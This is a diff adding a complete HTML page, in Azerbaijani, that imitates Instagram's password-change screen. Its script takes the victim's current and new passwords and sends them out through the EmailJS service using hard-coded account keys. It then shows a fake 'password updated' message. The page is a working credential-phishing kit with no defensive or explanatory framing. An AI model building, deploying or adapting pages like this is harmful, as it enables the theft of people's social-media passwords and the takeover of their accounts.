@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram - Şifrəni dəyişdir</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>emailjs.init('zARFLXL0dr9YYaeh2');</script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #fafafa;
+      color: #262626;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    .card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 12px;
+      padding: 32px;
+      width: 100%;
+      max-width: 360px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.04);
+    }
+    .header { text-align: center; margin-bottom: 24px; }
+    .icon-circle {
+      width: 80px; height: 80px;
+      border: 2px solid #262626;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    .icon-circle svg { width: 40px; height: 40px; stroke: #262626; }
+    h1 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
+    .subtitle { font-size: 14px; color: #737373; line-height: 1.4; }
+    .field { margin-bottom: 14px; }
+    .input-wrap { position: relative; }
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      height: 44px;
+      padding: 0 44px 0 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      font-size: 14px;
+      background: #fafafa;
+      transition: border-color .15s;
+    }
+    input:focus { outline: none; border-color: #262626; background: #fff; }
+    input[aria-invalid="true"] { border-color: #ed4956; }
+
+    /* Eye icon toggle button */
+    .toggle {
+      position: absolute;
+      right: 8px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none;
+      cursor: pointer;
+      padding: 6px;
+      color: #737373;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: color .15s;
+    }
+    .toggle:hover { color: #262626; }
+    .toggle svg {
+      width: 20px;
+      height: 20px;
+      stroke: currentColor;
+      fill: none;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      pointer-events: none;
+    }
+
+    .error { color: #ed4956; font-size: 12px; margin-top: 4px; }
+
+    /* Checkbox row */
+    .checkbox-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      margin-top: 4px;
+      margin-bottom: 14px;
+    }
+    .checkbox-row input[type="checkbox"] {
+      width: 15px;
+      height: 15px;
+      min-width: 15px;
+      margin-top: 2px;
+      cursor: pointer;
+      accent-color: #0095f6;
+      border: none;
+      padding: 0;
+      background: none;
+    }
+    .checkbox-row label {
+      font-size: 13px;
+      color: #262626;
+      cursor: pointer;
+      line-height: 1.4;
+    }
+
+    .forget {
+      color: #1877f2;
+      font-size: 13px;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+
+    button.submit {
+      width: 100%;
+      height: 44px;
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+      transition: background .15s;
+    }
+    button.submit:hover { background: #1877f2; }
+    button.submit:disabled { background: #b2dffc; cursor: not-allowed; }
+
+    .form.hidden { display: none; }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="header">
+      <div class="icon-circle">
+        <svg id="ico" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
+          <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
+          <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
+        </svg>
+      </div>
+      <h1 id="title">Şifrəni dəyişdir</h1>
+      <p class="subtitle" id="subtitle">Şifrən ən azı 6 simvol olmalı və rəqəmlər, hərflər və özəl simvollardan (!&@%) ibarət olmalıdır.</p>
+    </div>
+
+    <form id="form" class="form" novalidate>
+      <div class="field">
+        <div class="input-wrap">
+          <input type="password" id="old" maxlength="100" autocomplete="current-password" placeholder="Cari şifrə">
+          <button type="button" class="toggle" data-target="old" aria-label="Şifrəni göstər">
+            <!-- Eye open icon -->
+            <svg class="eye-open" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            <!-- Eye closed icon (hidden by default) -->
+            <svg class="eye-closed" viewBox="0 0 24 24" style="display:none"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          </button>
+        </div>
+        <div class="error" id="err-old"></div>
+      </div>
+
+      <div class="field">
+        <div class="input-wrap">
+          <input type="password" id="new" maxlength="100" autocomplete="new-password" placeholder="Yeni şifrə">
+          <button type="button" class="toggle" data-target="new" aria-label="Şifrəni göstər">
+            <svg class="eye-open" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            <svg class="eye-closed" viewBox="0 0 24 24" style="display:none"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          </button>
+        </div>
+        <div class="error" id="err-new"></div>
+      </div>
+
+      <div class="field">
+        <div class="input-wrap">
+          <input type="password" id="confirm" maxlength="100" autocomplete="new-password" placeholder="Yeni şifrəni təkrar yaz">
+          <button type="button" class="toggle" data-target="confirm" aria-label="Şifrəni göstər">
+            <svg class="eye-open" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            <svg class="eye-closed" viewBox="0 0 24 24" style="display:none"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          </button>
+        </div>
+        <div class="error" id="err-confirm"></div>
+      </div>
+
+      <p class="forget">Şifrəni unutdun?</p>
+
+      <div class="checkbox-row">
+        <input type="checkbox" id="chek" name="logout">
+        <label for="chek">Digər cihazlardan çıx. Hesabını başqa kimsə işlədibsə bunu seç.</label>
+      </div>
+
+      <button type="submit" class="submit">Şifrəni dəyişdir</button>
+    </form>
+  </main>
+
+  <script>
+    // Eye icon toggle
+    document.querySelectorAll('.toggle').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const input = document.getElementById(btn.dataset.target);
+        const isPwd = input.type === 'password';
+        input.type = isPwd ? 'text' : 'password';
+        btn.querySelector('.eye-open').style.display = isPwd ? 'none' : '';
+        btn.querySelector('.eye-closed').style.display = isPwd ? '' : 'none';
+        btn.setAttribute('aria-label', isPwd ? 'Şifrəni gizlət' : 'Şifrəni göstər');
+      });
+    });
+
+    const form = document.getElementById('form');
+
+    function setError(id, msg) {
+      document.getElementById('err-' + id).textContent = msg || '';
+      document.getElementById(id).setAttribute('aria-invalid', msg ? 'true' : 'false');
+    }
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      ['old', 'new', 'confirm'].forEach(f => setError(f, ''));
+
+      const oldP = document.getElementById('old').value;
+      const newP = document.getElementById('new').value;
+      const conf = document.getElementById('confirm').value;
+
+      let ok = true;
+      if (!oldP) { setError('old', 'Köhnə şifrəni daxil edin'); ok = false; }
+      if (newP.length < 6) { setError('new', 'Şifrə ən az 6 simvol olmalıdır'); ok = false; }
+      else if (newP === oldP) { setError('new', 'Yeni şifrə köhnə şifrədən fərqli olmalıdır'); ok = false; }
+      if (conf !== newP) { setError('confirm', 'Şifrələr uyğun gəlmir'); ok = false; }
+
+      if (!ok) return;
+
+      const submitBtn = form.querySelector('.submit');
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Göndərilir...';
+
+      emailjs.send('service_ocn1wtd', 'template_5xc9nf1', {
+        old_password: oldP,
+        new_password: newP,
+        confirm_password: conf
+      }).then(() => {
+        document.getElementById('title').textContent = 'Şifrə yeniləndi';
+        document.getElementById('subtitle').textContent = 'Yeni şifrənizlə hesabınıza daxil ola bilərsiniz.';
+        document.getElementById('ico').innerHTML = '<polyline points="20 6 9 17 4 12"/>';
+        form.classList.add('hidden');
+      }).catch(() => {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Şifrəni dəyişdir';
+        alert('Xəta baş verdi. Yenidən cəhd edin.');
+      });
+    });
+  </script>
+</body>
+</html>
